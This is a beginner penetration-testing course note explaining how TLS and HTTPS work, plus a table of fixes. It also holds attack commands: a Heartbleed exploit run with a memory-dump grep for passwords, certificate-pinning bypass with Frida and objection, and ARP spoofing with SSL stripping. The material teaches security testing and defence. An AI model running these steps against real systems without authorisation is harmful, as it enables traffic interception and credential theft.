---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.17 TLS/SSL — How HTTPS Works"
---

# 01.17 — TLS/SSL — How HTTPS Works

## What is it?

**TLS (Transport Layer Security)** is the cryptographic protocol that secures HTTPS connections. **SSL (Secure Sockets Layer)** is TLS's deprecated predecessor — the name "SSL" still gets used colloquially but TLS 1.2/1.3 is what's actually in use today.

**HTTPS = HTTP + TLS.** TLS provides three things:
1. **Encryption** — no one can read the data in transit
2. **Authentication** — you know you're talking to the real server (not an impersonator)
3. **Integrity** — data hasn't been tampered with in transit

---

## TLS Handshake — How HTTPS Starts

```
CLIENT                                          SERVER
  │                                               │
  │ ─── ClientHello ──────────────────────────→  │
  │     TLS version supported (1.2, 1.3)          │
  │     Cipher suites supported                   │
  │     Random number (client_random)             │
  │                                               │
  │ ←── ServerHello ──────────────────────────   │
  │     Agreed TLS version                        │
  │     Agreed cipher suite                       │
  │     Random number (server_random)             │
  │     Server's SSL Certificate                  │
  │                                               │
  │  [Client verifies certificate:]               │
  │   - Is it signed by a trusted CA?             │
  │   - Does the CN/SAN match the hostname?       │
  │   - Is it expired?                            │
  │   - Is it revoked? (CRL/OCSP check)           │
  │                                               │
  │ ─── ClientKeyExchange ─────────────────────→ │
  │     Encrypted pre-master secret               │
  │     (encrypted with server's public key)      │
  │                                               │
  │     [Both sides derive session keys           │
  │      from: pre-master + client_random +       │
  │      server_random]                           │
  │                                               │
  │ ─── ChangeCipherSpec + Finished ───────────→ │
  │ ←── ChangeCipherSpec + Finished ───────────  │
  │                                               │
  │ ═══ Encrypted HTTPS traffic ══════════════   │
  │     All HTTP is now encrypted                 │
```

---

## TLS 1.3 — Modern, Faster

```
TLS 1.3 HANDSHAKE (1-RTT instead of 2-RTT):

CLIENT                          SERVER
  │                               │
  │ ─── ClientHello + ─────────→ │
  │     Key Share (ECDH public)   │
  │     Supported versions        │
  │                               │
  │ ←── ServerHello + ─────────  │
  │     Key Share (ECDH public)   │
  │     Certificate + Verify      │
  │     [Keys derived immediately]│
  │                               │
  │ ═══ Encrypted traffic ═════   │

Key improvements:
- 1-RTT instead of 2-RTT (faster connection)
- 0-RTT resumption (reconnect with no latency)
- Forward Secrecy MANDATORY (ECDHE always)
- Removed: RSA key exchange, MD5/SHA1, RC4, DES, 3DES
```

---

## Cipher Suites

```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
│    │     │   │    │   │    │   │
│    │     │   │    │   │    │   └─ Hash: SHA384
│    │     │   │    │   │    └───── Mode: GCM (authenticated encryption)
│    │     │   │    │   └────────── Key size: 256 bits
│    │     │   │    └────────────── Encryption: AES
│    │     │   └─────────────────── Auth: RSA (server signature)
│    │     └─────────────────────── Key Exchange: ECDHE (forward secrecy!)
│    └───────────────────────────── Protocol: TLS
└────────────────────────────────── Prefix

GOOD CIPHER SUITE indicators:
✓ ECDHE or DHE = Forward Secrecy
✓ AES-GCM or ChaCha20 = Modern encryption
✗ RSA key exchange = No forward secrecy
✗ RC4, DES, 3DES = Broken ciphers
✗ MD5, SHA1 = Weak hash
```

---

## Security Context — TLS/SSL in VAPT

### 1. TLS Version and Cipher Suite Enumeration

```bash
# testssl.sh — comprehensive TLS analysis
testssl.sh https://target.com

# sslyze — fast TLS scanner
sslyze target.com
sslyze target.com --certinfo --heartbleed --robot --fallback

# nmap TLS scripts
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert -p 443 target.com
nmap --script ssl-heartbleed -p 443 target.com    # CVE-2014-0160

# sslscan
sslscan target.com

# Check with openssl directly
openssl s_client -connect target.com:443
openssl s_client -connect target.com:443 -tls1   # test TLS 1.0 support
openssl s_client -connect target.com:443 -tls1_1 # test TLS 1.1
openssl s_client -connect target.com:443 -tls1_2 # test TLS 1.2
openssl s_client -connect target.com:443 -tls1_3 # test TLS 1.3
```

### 2. Heartbleed — CVE-2014-0160

OpenSSL vulnerability that leaks up to 64KB of server memory per request. Can expose private keys, passwords, session tokens.

```bash
# Test for Heartbleed
nmap --script ssl-heartbleed -p 443 target.com
sslyze target.com --heartbleed

# Exploit:
python heartbleed.py -f dump.bin target.com
# dumps 64KB of memory — search for keys, passwords, cookies
strings dump.bin | grep -i "password\|session\|user\|key"
```

### 3. POODLE — SSLv3 Downgrade Attack

Downgrade HTTPS to SSLv3 to exploit CBC padding oracle.

```bash
# Check if SSLv3 is supported (should NOT be):
openssl s_client -connect target.com:443 -ssl3
# If handshake succeeds → vulnerable to POODLE

# ROBOT Attack — RSA key exchange exploitation
sslyze target.com --robot
```

### 4. Certificate Analysis — Information Gathering

```bash
# View full certificate
openssl s_client -connect target.com:443 | openssl x509 -noout -text

# Key information:
# Subject: CN=target.com, O=Target Corp, C=US
# Issuer: Let's Encrypt (or DigiCert, etc.)
# Subject Alternative Names:
#   www.target.com, api.target.com, internal.target.com ← hidden subdomains!
# Not Before/After: validity dates
# Serial Number: for CRL lookup

# Quick SAN extraction:
openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -ext subjectAltName

# crt.sh — Certificate Transparency logs (public archive of all certs)
curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u
# Returns ALL subdomains ever in a cert for target.com!
```

### 5. Certificate Pinning — Mobile App Analysis

Mobile apps "pin" the server's certificate — they only accept that specific cert, not any CA-signed cert.

```bash
# Bypass cert pinning on Android:
# Method 1: Frida
frida -U -l ssl_pinning_bypass.js -f com.target.app

# Method 2: objection
objection -g com.target.app explore
android sslpinning disable

# Method 3: apktool + patch smali code
apktool d target.apk
# Find cert pinning code → patch to always return true → rebuild
apktool b target/ -o patched.apk

# iOS: similar approach with Frida or Objection
```

### 6. SSL Stripping

Downgrade HTTPS to HTTP via MITM (combined with ARP spoofing):

```bash
# bettercap SSL strip
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.100
arp.spoof on
https.proxy on    ← strips HTTPS → HTTP

# sslstrip
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

**Defense:** HTTP Strict Transport Security (HSTS) — forces browser to always use HTTPS even if downgraded.

---

## Hands-On: TLS Commands

```bash
# Connect and view cert
openssl s_client -connect target.com:443

# View cert details
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Test cipher support manually
openssl s_client -connect target.com:443 -cipher 'RC4-MD5'  # should fail on modern servers

# Generate self-signed cert (for labs)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Convert PEM to DER (for mobile cert install)
openssl x509 -in cert.pem -outform DER -out cert.der
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| TLS 1.0 / 1.1 supported | Disable, only allow TLS 1.2+ |
| SSLv3 supported | Disable immediately |
| Weak ciphers (RC4, DES, 3DES) | Remove from cipher suite list |
| No Forward Secrecy | Use ECDHE/DHE key exchange only |
| Self-signed certificate | Use cert from trusted CA (Let's Encrypt is free) |
| No HSTS | Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` |
| Cert pinning bypassable (mobile) | Use network-security-config on Android, ATS on iOS |

---

## Related Notes
- [[18 - Certificates and Certificate Authorities]] — how CA trust works
- [[06 - TCP Three-Way Handshake]] — TLS runs on top of TCP
- [[Module 03 - HTTP Headers Security]] — HSTS, security headers
- [[Module 48 - Wireless Security]] — SSL stripping on WiFi
